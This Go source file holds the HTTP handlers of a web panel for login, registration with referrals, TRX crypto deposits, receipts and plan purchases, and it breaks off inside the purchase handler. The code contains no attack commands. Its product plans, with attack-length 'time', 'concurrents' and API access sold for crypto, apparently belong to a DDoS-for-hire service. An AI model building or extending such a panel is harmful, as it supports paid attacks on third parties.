package main

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"errors"
	"fmt"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"github.com/dchest/captcha"
)

type SessionInfo struct {
	Token     string `json:"token"`
	CreatedAt int64  `json:"created_at"`
	LastSeen  int64  `json:"last_seen"`
	UserAgent string `json:"user_agent"`
	IP        string `json:"ip"`
	Expires   int64  `json:"expires"`
	IsCurrent bool   `json:"is_current"`
}

var captchaVerify = captcha.VerifyString

const maxBodySize = 64 << 10 // 64KB

// --- HANDLERS ---

func handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		ip := getIP(r)
		if isRateLimited(ip) {
			logRateLimit(r, ip, Sanitize(r.FormValue("username")))
			LogActivity(r, ActivityLogEntry{
				ActorType: actorTypeUser,
				Action:    "AUTH_LOGIN_RATE_LIMIT",
				Severity:  severityWarn,
				Username:  Sanitize(r.FormValue("username")),
				Message:   "Login rate limited.",
			})
			http.Redirect(w, r, "/login?err=rate_limit", http.StatusFound)
			return
		}
		if !validateCSRF(r) {
			LogActivity(r, ActivityLogEntry{
				ActorType: actorTypeUser,
				Action:    "AUTH_LOGIN_CSRF_FAIL",
				Severity:  severityWarn,
				Username:  Sanitize(r.FormValue("username")),
				Message:   "Login blocked by CSRF validation.",
			})
			http.Redirect(w, r, "/login?err=csrf", http.StatusFound)
			return
		}

		u := Sanitize(r.FormValue("username"))
		p := r.FormValue("password")
		var dbHash string
		err := db.QueryRow("SELECT password FROM users WHERE username=?", u).Scan(&dbHash)
		match, _ := comparePasswordAndHash(p, dbHash)
		if err == nil && match {
			db.Exec("DELETE FROM sessions WHERE username=?", u)
			token := createSession(u, r)
			if token == "" {
				LogActivity(r, ActivityLogEntry{
					ActorType: actorTypeUser,
					ActorID:   getUserIDByUsername(u),
					Username:  u,
					Action:    "AUTH_LOGIN_FAILED",
					Severity:  severityError,
					Message:   "Login failed while creating session.",
				})
				http.Redirect(w, r, "/login?err=session", http.StatusFound)
				return
			}
			setSessionCookie(w, r, token, 86400)
			LogActivity(r, ActivityLogEntry{
				ActorType: actorTypeUser,
				ActorID:   getUserIDByUsername(u),
				Username:  u,
				Action:    "AUTH_LOGIN_SUCCESS",
				Severity:  severityInfo,
				Message:   "User logged in successfully.",
			})
			if u == "admin" {
				http.Redirect(w, r, "/admin?view=overview", http.StatusFound)
			} else {
				http.Redirect(w, r, "/dashboard?welcome=true", http.StatusFound)
			}
		} else {
			LogActivity(r, ActivityLogEntry{
				ActorType: actorTypeUser,
				Username:  u,
				Action:    "AUTH_LOGIN_FAILED",
				Severity:  severityWarn,
				Message:   "Login failed due to invalid credentials.",
			})
			http.Redirect(w, r, "/login?err=invalid", http.StatusFound)
		}
		return
	}

	setSecurityHeaders(w)
	token := ensureCSRFCookie(w, r)
	loginMode := "login"
	switch r.URL.Query().Get("mode") {
	case "token", "redeem":
		loginMode = r.URL.Query().Get("mode")
	}
	msg, msgType := flashMessageFromQuery(r)
	renderTemplate(w, "login.html", PageData{
		CsrfToken:    token,
		FlashMessage: msg,
		FlashType:    msgType,
		LoginMode:    loginMode,
	})
}

func handleTokenLogin(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	if r.Method != http.MethodPost {
		http.Redirect(w, r, "/login?mode=token", http.StatusFound)
		return
	}
	ip := getIP(r)
	if isRateLimited(ip) {
		logRateLimit(r, ip, "")
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeUser,
			Action:    "AUTH_TOKEN_LOGIN_RATE_LIMIT",
			Severity:  severityWarn,
			Message:   "Token login rate limited.",
		})
		http.Redirect(w, r, "/login?err=rate_limit&mode=token", http.StatusFound)
		return
	}
	if !validateCSRF(r) {
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeUser,
			Action:    "AUTH_TOKEN_LOGIN_CSRF_FAIL",
			Severity:  severityWarn,
			Message:   "Token login blocked by CSRF validation.",
		})
		http.Redirect(w, r, "/login?err=csrf&mode=token", http.StatusFound)
		return
	}

	token := strings.TrimSpace(r.FormValue("token"))
	if token == "" {
		http.Redirect(w, r, "/login?err=invalid_token&mode=token", http.StatusFound)
		return
	}
	usr, ok := getUserByToken(token)
	if !ok {
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeUser,
			Action:    "AUTH_TOKEN_LOGIN_FAILED",
			Severity:  severityWarn,
			Message:   "Token login failed due to invalid token.",
		})
		http.Redirect(w, r, "/login?err=invalid_token&mode=token", http.StatusFound)
		return
	}
	db.Exec("DELETE FROM sessions WHERE username=?", usr.Username)
	sessionToken := createSession(usr.Username, r)
	if sessionToken == "" {
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeUser,
			ActorID:   getUserIDByUsername(usr.Username),
			Username:  usr.Username,
			Action:    "AUTH_TOKEN_LOGIN_FAILED",
			Severity:  severityError,
			Message:   "Token login failed while creating session.",
		})
		http.Redirect(w, r, "/login?err=session&mode=token", http.StatusFound)
		return
	}
	setSessionCookie(w, r, sessionToken, 86400)
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeUser,
		ActorID:   getUserIDByUsername(usr.Username),
		Username:  usr.Username,
		Action:    "AUTH_TOKEN_LOGIN_SUCCESS",
		Severity:  severityInfo,
		Message:   "Token login succeeded.",
	})
	if usr.Username == "admin" {
		http.Redirect(w, r, "/admin?view=overview", http.StatusFound)
		return
	}
	http.Redirect(w, r, "/dashboard?welcome=true", http.StatusFound)
}

func registerRedirectURL(errCode, refCode string) string {
	values := url.Values{}
	if errCode != "" {
		values.Set("err", errCode)
	}
	if refCode != "" {
		values.Set("ref", refCode)
	}
	if len(values) == 0 {
		return "/register"
	}
	return "/register?" + values.Encode()
}

func handleUserInfo(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	// Prefer Authorization: Bearer <token> (keeps tokens out of URLs/logs/history).
	// Backward compatible with ?token=... for now.
	tok := ""
	if ah := r.Header.Get("Authorization"); strings.HasPrefix(ah, "Bearer ") {
		tok = strings.TrimSpace(strings.TrimPrefix(ah, "Bearer "))
	}
	if tok == "" {
		tok = r.URL.Query().Get("token")
	}

	usr, ok := getUserByToken(tok)
	if !ok {
		writeJSONError(w, http.StatusForbidden, "bad_token", "Invalid token.")
		return
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"username": usr.Username,
		"plan":     usr.Plan,
		"balance":  usr.Balance,
		"status":   usr.Status,
	})
}

func handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		ip := getIP(r)
		if isRateLimited(ip) {
			logRateLimit(r, ip, Sanitize(r.FormValue("username")))
			LogActivity(r, ActivityLogEntry{
				ActorType: actorTypeUser,
				Action:    "AUTH_REGISTER_RATE_LIMIT",
				Severity:  severityWarn,
				Username:  Sanitize(r.FormValue("username")),
				Message:   "Registration rate limited.",
			})
			http.Redirect(w, r, registerRedirectURL("rate_limit", strings.TrimSpace(Sanitize(r.FormValue("ref")))), http.StatusFound)
			return
		}
		if !validateCSRF(r) {
			LogActivity(r, ActivityLogEntry{
				ActorType: actorTypeUser,
				Action:    "AUTH_REGISTER_CSRF_FAIL",
				Severity:  severityWarn,
				Username:  Sanitize(r.FormValue("username")),
				Message:   "Registration blocked by CSRF validation.",
			})
			http.Redirect(w, r, registerRedirectURL("csrf", strings.TrimSpace(Sanitize(r.FormValue("ref")))), http.StatusFound)
			return
		}

		u := Sanitize(r.FormValue("username"))
		p := r.FormValue("password")
		captchaId := r.FormValue("captchaId")
		captchaSolution := r.FormValue("captcha")
		refCode := strings.TrimSpace(Sanitize(r.FormValue("ref")))

		if !captchaVerify(captchaId, captchaSolution) {
			LogActivity(r, ActivityLogEntry{
				ActorType: actorTypeUser,
				Action:    "AUTH_REGISTER_CAPTCHA_FAIL",
				Severity:  severityWarn,
				Username:  u,
				Message:   "Registration failed due to captcha validation.",
			})
			http.Redirect(w, r, registerRedirectURL("captcha_wrong", refCode), http.StatusFound)
			return
		}

		var count int
		db.QueryRow("SELECT count(*) FROM users WHERE username = ?", u).Scan(&count)
		if count == 0 {
			hashedPass, _ := generatePasswordHash(p)
			myRefCode, err := generateUniqueRefCode()
			if err != nil {
				http.Redirect(w, r, registerRedirectURL("db", refCode), http.StatusFound)
				return
			}
			var validRef string
			if refCode != "" {
				if err := db.QueryRow("SELECT username FROM users WHERE ref_code=?", refCode).Scan(&validRef); err != nil {
					if err == sql.ErrNoRows {
						LogActivity(r, ActivityLogEntry{
							ActorType: actorTypeUser,
							Action:    "REFERRAL_INVALID",
							Severity:  severityWarn,
							Username:  u,
							Message:   "Registration failed due to invalid referral code.",
							Metadata: map[string]interface{}{
								"ref_code": refCode,
							},
						})
						http.Redirect(w, r, registerRedirectURL("bad_ref", refCode), http.StatusFound)
						return
					}
					http.Redirect(w, r, registerRedirectURL("db", refCode), http.StatusFound)
					return
				}
			}
			if validRef == u {
				LogActivity(r, ActivityLogEntry{
					ActorType: actorTypeUser,
					Action:    "REFERRAL_INVALID",
					Severity:  severityWarn,
					Username:  u,
					Message:   "Registration failed due to self-referral.",
				})
				http.Redirect(w, r, registerRedirectURL("bad_ref", refCode), http.StatusFound)
				return
			}
			db.Exec("INSERT INTO users (username, password, plan, status, api_token, user_id, balance, ref_code, referred_by, ref_earnings, ref_paid) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", u, hashedPass, "Free", "Active", generateToken(), "u#"+generateID(), 0.0, myRefCode, validRef, 0.0, 0)
			token := createSession(u, r)
			if token == "" {
				http.Redirect(w, r, registerRedirectURL("session", refCode), http.StatusFound)
				return
			}
			setSessionCookie(w, r, token, 86400)
			LogActivity(r, ActivityLogEntry{
				ActorType: actorTypeUser,
				ActorID:   getUserIDByUsername(u),
				Username:  u,
				Action:    "AUTH_REGISTER_SUCCESS",
				Severity:  severityInfo,
				Message:   "User registered successfully.",
				Metadata: map[string]interface{}{
					"referred_by": validRef,
				},
			})
			http.Redirect(w, r, "/dashboard?welcome=true", http.StatusFound)
		} else {
			LogActivity(r, ActivityLogEntry{
				ActorType: actorTypeUser,
				Action:    "AUTH_REGISTER_FAILED",
				Severity:  severityWarn,
				Username:  u,
				Message:   "Registration failed due to duplicate username.",
			})
			http.Redirect(w, r, registerRedirectURL("taken", refCode), http.StatusFound)
		}
		return
	}

	setSecurityHeaders(w)
	token := ensureCSRFCookie(w, r)
	captchaId := captcha.New()
	msg, msgType := flashMessageFromQuery(r)
	refCode := strings.TrimSpace(Sanitize(r.URL.Query().Get("ref")))
	renderTemplate(w, "register.html", PageData{CaptchaId: captchaId, CsrfToken: token, FlashMessage: msg, FlashType: msgType, ReferralCode: refCode, ReferralLocked: refCode != ""})
}

func handleCreateDeposit(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok {
		http.Redirect(w, r, "/login", 302)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if r.ContentLength > maxBodySize {
		http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
	if err := r.ParseForm(); err != nil {
		if isRequestBodyTooLarge(err) {
			http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
			return
		}
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	requestID := strings.TrimSpace(r.FormValue("request_id"))

	rawAmt := r.FormValue("amount")
	usdAmt, err := strconv.ParseFloat(rawAmt, 64)
	if err != nil || usdAmt < 1 {
		http.Redirect(w, r, "/deposit?err=min", http.StatusFound)
		return
	}

	trxPrice := getTrxPrice()
	if trxPrice <= 0 {
		trxPrice = 0.15
	}
	trxAmount := roundFloat(usdAmt/trxPrice, 2)

	walletMu.Lock()
	defer walletMu.Unlock()

	tx, err := db.Begin()
	if err != nil {
		logDepositError("create_deposit", "", 0, getUserIDByUsername(username), "DB_ERROR", err, nil)
		http.Redirect(w, r, "/deposit?err=db", http.StatusFound)
		return
	}

	now := time.Now()
	if err := expirePendingDepositsTx(tx, now); err != nil {
		if rollbackErr := tx.Rollback(); rollbackErr != nil {
			err = fmt.Errorf("expire pending: %w; rollback: %v", err, rollbackErr)
		}
		logDepositError("expire_pending_deposits", "", 0, getUserIDByUsername(username), "DB_ERROR", err, nil)
		http.Redirect(w, r, "/deposit?err=db", http.StatusFound)
		return
	}

	depID := generateID()
	if requestID != "" {
		res, err := tx.Exec("INSERT OR IGNORE INTO idempotency_keys (key, user_id, action, reference_id, created_at) VALUES (?, ?, ?, ?, ?)", requestID, username, "deposit", depID, time.Now().Unix())
		if err != nil {
			if rollbackErr := tx.Rollback(); rollbackErr != nil {
				err = fmt.Errorf("idempotency insert: %w; rollback: %v", err, rollbackErr)
			}
			logDepositError("create_deposit", depID, 0, getUserIDByUsername(username), "DB_ERROR", err, nil)
			http.Redirect(w, r, "/deposit?err=db", http.StatusFound)
			return
		}
		if rows, _ := res.RowsAffected(); rows == 0 {
			var existing string
			_ = tx.QueryRow("SELECT reference_id FROM idempotency_keys WHERE key=? AND user_id=? AND action=?", requestID, username, "deposit").Scan(&existing)
			tx.Rollback()
			if existing != "" {
				LogActivity(r, ActivityLogEntry{
					ActorType: actorTypeUser,
					ActorID:   getUserIDByUsername(username),
					Username:  username,
					Action:    "DEPOSIT_IDEMPOTENCY_BLOCKED",
					Severity:  severityWarn,
					Message:   "Deposit request blocked due to idempotency key reuse.",
					ResourceIDs: map[string]string{
						"deposit_id": existing,
					},
				})
				http.Redirect(w, r, "/deposit/pay?id="+existing+"&msg=deposit_exists", http.StatusFound)
				return
			}
			LogActivity(r, ActivityLogEntry{
				ActorType: actorTypeUser,
				ActorID:   getUserIDByUsername(username),
				Username:  username,
				Action:    "DEPOSIT_IDEMPOTENCY_BLOCKED",
				Severity:  severityWarn,
				Message:   "Deposit request blocked due to duplicate submission.",
			})
			http.Redirect(w, r, "/deposit?err=duplicate", http.StatusFound)
			return
		}
	}
	walletRow, err := reserveUsableWalletTx(tx, now, depID)
	if err != nil {
		if errors.Is(err, errNoUsableWallets) || errors.Is(err, errInvalidWalletRows) || errors.Is(err, errWalletReservation) {
			diag, diagErr := walletDiagnosticsTx(tx, now)
			if diagErr != nil {
				diag = nil
			}
			category := "NO_USABLE_WALLETS"
			if errors.Is(err, errInvalidWalletRows) {
				category = "INVALID_WALLET_ROWS"
			}
			if errors.Is(err, errWalletReservation) {
				category = "WALLET_RESERVATION_CONFLICT"
			}
			if rollbackErr := tx.Rollback(); rollbackErr != nil {
				err = fmt.Errorf("wallet reserve: %w; rollback: %v", err, rollbackErr)
			}
			logDepositError("reserve_wallet", depID, 0, getUserIDByUsername(username), category, err, diag)
			http.Redirect(w, r, "/deposit?err=wallets", http.StatusFound)
			return
		}
		if rollbackErr := tx.Rollback(); rollbackErr != nil {
			err = fmt.Errorf("wallet reserve: %w; rollback: %v", err, rollbackErr)
		}
		logDepositError("reserve_wallet", depID, 0, getUserIDByUsername(username), "DB_ERROR", err, nil)
		http.Redirect(w, r, "/deposit?err=db", http.StatusFound)
		return
	}
	expires := time.Now().Add(15 * time.Minute).Unix()

	_, err = tx.Exec("INSERT INTO deposits (id, user_id, amount, usd_amount, address, status, date, expires) VALUES (?, ?, ?, ?, ?, 'Pending', ?, ?)",
		depID, username, trxAmount, usdAmt, walletRow.Address, time.Now().Format("2006-01-02 15:04"), expires)

	if err != nil {
		if rollbackErr := tx.Rollback(); rollbackErr != nil {
			err = fmt.Errorf("deposit insert: %w; rollback: %v", err, rollbackErr)
		}
		logDepositError("create_deposit", depID, walletRow.RowID, getUserIDByUsername(username), "DEPOSIT_INSERT_FAILED", err, nil)
		http.Redirect(w, r, "/deposit?err=db", http.StatusFound)
		return
	}

	if err := tx.Commit(); err != nil {
		if rollbackErr := tx.Rollback(); rollbackErr != nil {
			err = fmt.Errorf("commit: %w; rollback: %v", err, rollbackErr)
		}
		logDepositError("create_deposit", depID, walletRow.RowID, getUserIDByUsername(username), "TX_COMMIT_FAILED", err, nil)
		http.Redirect(w, r, "/deposit?err=db", http.StatusFound)
		return
	}

	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeUser,
		ActorID:   getUserIDByUsername(username),
		Username:  username,
		Action:    "DEPOSIT_CREATED",
		Severity:  severityInfo,
		Message:   "Deposit created.",
		ResourceIDs: map[string]string{
			"deposit_id": depID,
		},
		Metadata: map[string]interface{}{
			"usd_amount": usdAmt,
			"trx_amount": trxAmount,
			"wallet":     maskAddress(walletRow.Address),
		},
	})
	http.Redirect(w, r, "/deposit/pay?id="+depID+"&msg=deposit_created", http.StatusFound)
}

func handleInvoicePage(w http.ResponseWriter, r *http.Request) {
	handleDepositPayPage(w, r)
}

func handleDepositPayPage(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	username, ok := validateSession(r)
	if !ok {
		http.Redirect(w, r, "/login", 302)
		return
	}
	id := Sanitize(r.URL.Query().Get("id"))
	if id == "" {
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}
	if id == "" {
		http.Redirect(w, r, "/deposit", 302)
		return
	}
	var d Deposit
	var expiresRaw string
	err := db.QueryRow("SELECT id, user_id, amount, usd_amount, address, status, expires FROM deposits WHERE id=?", id).
		Scan(&d.ID, &d.UserID, &d.Amount, &d.UsdAmount, &d.Address, &d.Status, &expiresRaw)
	if err != nil {
		http.Redirect(w, r, "/deposit", 302)
		return
	}
	d.Expires = parseDepositExpires(expiresRaw)
	if d.UserID != username && username != "admin" {
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}
	if !d.Expires.IsZero() && d.Status == "Pending" && time.Now().After(d.Expires) {
		now := time.Now()
		tx, err := db.Begin()
		if err != nil {
			logDepositError("expire_deposit", d.ID, 0, getUserIDByUsername(username), "DB_ERROR", err, nil)
		} else {
			if _, err := tx.Exec("UPDATE deposits SET status='Expired' WHERE id = ? AND lower(status)='pending'", d.ID); err != nil {
				if rollbackErr := tx.Rollback(); rollbackErr != nil {
					err = fmt.Errorf("expire update: %w; rollback: %v", err, rollbackErr)
				}
				logDepositError("expire_deposit", d.ID, 0, getUserIDByUsername(username), "DEPOSIT_UPDATE_FAILED", err, nil)
			} else if err := releaseWalletForDepositTx(tx, d.ID, now); err != nil {
				if rollbackErr := tx.Rollback(); rollbackErr != nil {
					err = fmt.Errorf("release wallet: %w; rollback: %v", err, rollbackErr)
				}
				logDepositError("release_wallet", d.ID, 0, getUserIDByUsername(username), "WALLET_RELEASE_FAILED", err, nil)
			} else if err := tx.Commit(); err != nil {
				if rollbackErr := tx.Rollback(); rollbackErr != nil {
					err = fmt.Errorf("expire commit: %w; rollback: %v", err, rollbackErr)
				}
				logDepositError("expire_deposit", d.ID, 0, getUserIDByUsername(username), "TX_COMMIT_FAILED", err, nil)
			} else {
				d.Status = "Expired"
			}
		}
	}
	remaining := int(time.Until(d.Expires).Seconds())
	if remaining < 0 {
		remaining = 0
	}
	d.Amount = roundFloat(d.Amount, 2)
	expiresAt := "N/A"
	if !d.Expires.IsZero() {
		expiresAt = d.Expires.Format("2006-01-02 15:04")
	}
	data := PaymentPageData{
		ID:               d.ID,
		Address:          d.Address,
		Amount:           d.Amount,
		UsdAmount:        d.UsdAmount,
		ExpiresInSeconds: remaining,
		ExpiresAt:        expiresAt,
		Status:           normalizeDepositStatus(d.Status),
		Currency:         "TRX",
	}
	data.FlashMessage, data.FlashType = flashMessageFromQuery(r)
	renderTemplate(w, "deposit_pay.html", data)
}

func handleReceiptPage(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	data, ok := loadReceiptData(w, r)
	if !ok {
		return
	}
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeUser,
		ActorID:   data.UserID,
		Username:  data.Username,
		Action:    "RECEIPT_VIEW",
		Severity:  severityInfo,
		Message:   "Receipt viewed.",
		ResourceIDs: map[string]string{
			"deposit_id": data.ID,
		},
	})
	renderTemplate(w, "receipt.html", data)
}

func handleReceiptDownload(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	data, ok := loadReceiptData(w, r)
	if !ok {
		return
	}
	data.IsDownload = true
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeUser,
		ActorID:   data.UserID,
		Username:  data.Username,
		Action:    "RECEIPT_DOWNLOAD",
		Severity:  severityInfo,
		Message:   "Receipt downloaded.",
		ResourceIDs: map[string]string{
			"deposit_id": data.ID,
		},
	})
	filename := fmt.Sprintf("receipt-%s.html", data.ID)
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	renderTemplate(w, "receipt.html", data)
}

func handleCheckDeposit(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	w.Header().Set("Content-Type", "application/json")
	username, ok := validateSession(r)
	if !ok {
		writeJSONError(w, http.StatusUnauthorized, "unauthorized", "Authentication required.")
		return
	}
	id := Sanitize(r.URL.Query().Get("id"))
	var status string
	var owner string
	var expiresRaw string
	err := db.QueryRow("SELECT status, user_id, expires FROM deposits WHERE id = ?", id).Scan(&status, &owner, &expiresRaw)
	if err != nil {
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}
	expires := parseDepositExpires(expiresRaw)
	if owner != username && username != "admin" {
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}
	if !expires.IsZero() && status == "Pending" && time.Now().After(expires) {
		now := time.Now()
		tx, err := db.Begin()
		if err != nil {
			logDepositError("expire_deposit", id, 0, getUserIDByUsername(username), "DB_ERROR", err, nil)
		} else {
			if _, err := tx.Exec("UPDATE deposits SET status='Expired' WHERE id = ? AND lower(status)='pending'", id); err != nil {
				if rollbackErr := tx.Rollback(); rollbackErr != nil {
					err = fmt.Errorf("expire update: %w; rollback: %v", err, rollbackErr)
				}
				logDepositError("expire_deposit", id, 0, getUserIDByUsername(username), "DEPOSIT_UPDATE_FAILED", err, nil)
			} else if err := releaseWalletForDepositTx(tx, id, now); err != nil {
				if rollbackErr := tx.Rollback(); rollbackErr != nil {
					err = fmt.Errorf("release wallet: %w; rollback: %v", err, rollbackErr)
				}
				logDepositError("release_wallet", id, 0, getUserIDByUsername(username), "WALLET_RELEASE_FAILED", err, nil)
			} else if err := tx.Commit(); err != nil {
				if rollbackErr := tx.Rollback(); rollbackErr != nil {
					err = fmt.Errorf("expire commit: %w; rollback: %v", err, rollbackErr)
				}
				logDepositError("expire_deposit", id, 0, getUserIDByUsername(username), "TX_COMMIT_FAILED", err, nil)
			} else {
				status = "Expired"
			}
		}
	}
	normalized := normalizeDepositStatus(status)
	json.NewEncoder(w).Encode(map[string]string{"status": normalized})
}

func loadReceiptData(w http.ResponseWriter, r *http.Request) (ReceiptData, bool) {
	username, ok := validateSession(r)
	if !ok {
		http.Redirect(w, r, "/login", 302)
		return ReceiptData{}, false
	}
	id := Sanitize(r.URL.Query().Get("id"))
	if id == "" {
		http.Redirect(w, r, "/deposit", 302)
		return ReceiptData{}, false
	}
	var d Deposit
	var userID string
	err := db.QueryRow(`SELECT d.id, d.user_id, u.user_id, d.amount, d.usd_amount, d.address, d.status, d.date,
		d.confirmed_at, d.txid, d.fee, d.notes
		FROM deposits d
		LEFT JOIN users u ON d.user_id = u.username
		WHERE d.id = ?`, id).
		Scan(&d.ID, &d.UserID, &userID, &d.Amount, &d.UsdAmount, &d.Address, &d.Status, &d.Date, &d.ConfirmedAt, &d.TxID, &d.Fee, &d.Notes)
	if err != nil {
		http.Redirect(w, r, "/deposit", 302)
		return ReceiptData{}, false
	}
	if d.UserID != username && username != "admin" {
		http.Error(w, "Forbidden", http.StatusForbidden)
		return ReceiptData{}, false
	}
	confirmed := ""
	if d.ConfirmedAt.Valid {
		confirmed = d.ConfirmedAt.String
	}
	txid := "Not available"
	if d.TxID.Valid && strings.TrimSpace(d.TxID.String) != "" {
		txid = d.TxID.String
	}
	fee := 0.0
	if d.Fee.Valid {
		fee = d.Fee.Float64
	}
	notes := "None"
	if d.Notes.Valid && strings.TrimSpace(d.Notes.String) != "" {
		notes = d.Notes.String
	}
	status := normalizeDepositStatus(d.Status)
	if userID == "" {
		userID = d.UserID
	}
	data := ReceiptData{
		ID:          d.ID,
		Username:    d.UserID,
		UserID:      userID,
		Address:     d.Address,
		Amount:      roundFloat(d.Amount, 2),
		UsdAmount:   roundFloat(d.UsdAmount, 2),
		Status:      status,
		CreatedAt:   d.Date,
		ConfirmedAt: confirmed,
		TxID:        txid,
		Fee:         fee,
		Notes:       notes,
		Currency:    "TRX",
	}
	return data, true
}

func normalizeDepositStatus(status string) string {
	switch strings.ToLower(strings.TrimSpace(status)) {
	case "confirmed", "paid":
		return "Paid"
	case "cancelled", "canceled", "rejected":
		return "Rejected"
	case "expired":
		return "Expired"
	default:
		return "Pending"
	}
}

func parseDepositExpires(raw string) time.Time {
	if raw == "" {
		return time.Time{}
	}
	if unix, err := strconv.ParseInt(raw, 10, 64); err == nil {
		return time.Unix(unix, 0)
	}
	if parsed, err := time.Parse("2006-01-02 15:04:05", raw); err == nil {
		return parsed
	}
	if parsed, err := time.Parse("2006-01-02 15:04", raw); err == nil {
		return parsed
	}
	if parsed, err := time.Parse(time.RFC3339, raw); err == nil {
		return parsed
	}
	return time.Time{}
}

func handlePurchase(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok {
		http.Redirect(w, r, "/login", 302)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if r.ContentLength > maxBodySize {
		http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
	if err := r.ParseForm(); err != nil {
		if isRequestBodyTooLarge(err) {
			http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
			return
		}
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeUser,
		ActorID:   getUserIDByUsername(username),
		Username:  username,
		Action:    "PURCHASE_ATTEMPT",
		Severity:  severityInfo,
		Message:   "Purchase attempt started.",
	})
	requestID := strings.TrimSpace(r.FormValue("request_id"))
	if requestID == "" {
		requestID = generateToken()
	}
	id, _ := strconv.Atoi(r.URL.Query().Get("id"))
	tx, err := db.Begin()
	if err != nil {
		http.Redirect(w, r, "/market?err=db", http.StatusFound)
		return
	}
	defer tx.Rollback()

	var p Product
	err = tx.QueryRow("SELECT name, price, time, concurrents, vip, api_access FROM products WHERE id=?", id).Scan(&p.Name, &p.Price, &p.Time, &p.Concurrents, &p.VIP, &p.APIAccess)
	if err != nil {
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeUser,
			ActorID:   getUserIDByUsername(username),
			Username:  username,
			Action:    "PURCHASE_FAILED",
			Severity:  severityWarn,
			Message:   "Purchase failed because the product was not found.",
			ResourceIDs: map[string]string{
				"product_id": strconv.Itoa(id),
			},
		})
		http.Redirect(w, r, "/market?err=prod", http.StatusFound)
		return
	}
	res, err := tx.Exec("INSERT OR IGNORE INTO idempotency_keys (key, user_id, action, reference_id, created_at) VALUES (?, ?, ?, ?, ?)", requestID, username, "purchase", strconv.Itoa(id), time.Now().Unix())
	if err != nil {
		http.Redirect(w, r, "/market?err=db", http.StatusFound)
		return
	}
	if rows, _ := res.RowsAffected(); rows == 0 {
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeUser,
			ActorID:   getUserIDByUsername(username),
			Username:  username,
			Action:    "PURCHASE_IDEMPOTENCY_BLOCKED",
			Severity:  severityWarn,
			Message:   "Purchase blocked due to idempotency key reuse.",
			ResourceIDs: map[string]string{
				"product_id": strconv.Itoa(id),
			},
		})
		http.Redirect(w, r, "/market?err=duplicate", http.StatusFound)
		return
	}
	var balance float64
	var referrer string
	err = tx.QueryRow("SELECT balance, referred_by FROM users WHERE username=?", username).Scan(&balance, &referrer)
	if err != nil {
		http.Redirect(w, r, "/market?err=user", http.StatusFound)
		return
	}
	if roundFloat(balance, 2) < roundFloat(p.Price, 2) {
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeUser,
			ActorID:   getUserIDByUsername(username),
			Username:  username,
			Action:    "PURCHASE_FAILED",
			Severity:  severityWarn,
			Message:   "Purchase failed due to insufficient balance.",
			ResourceIDs: map[string]string{
				"product_id": strconv.Itoa(id),
			},
		})
		http.Redirect(w, r, "/deposit?err=balance", http.StatusFound)
		return
	}

	newBalance := roundFloat(balance-p.Price, 2)
	if _, err := tx.Exec("UPDATE users SET balance=?, plan=? WHERE username=?", newBalance, p.Name, username); err != nil {
		http.Redirect(w, r, "/market?err=db", http.StatusFound)
		return
	}

	if referrer != "" && referrer != username && p.Price > 0 {
		kickback := roundFloat(p.Price*cfg.ReferralPercent, 2)
		res, err := tx.Exec("INSERT OR IGNORE INTO referral_credits (purchase_key, buyer, referrer, amount, product_id, created_at) VALUES (?, ?, ?, ?, ?, ?)", requestID, username, referrer, kickback, id, time.Now().Format("2006-01-02 15:04:05"))
		if err != nil {
			http.Redirect(w, r, "/market?err=db", http.StatusFound)
			return
		}
		if rows, _ := res.RowsAffected(); rows > 0 {
			if _, err := tx.Exec("UPDATE users SET balance=balance+?, ref_earnings=ref_earnings+? WHERE username=?", kickback, kickback, referrer); err != nil {
				http.Redirect(w, r, "/market?err=db", http.StatusFound)
				return
			}
		}
	}

	var count int
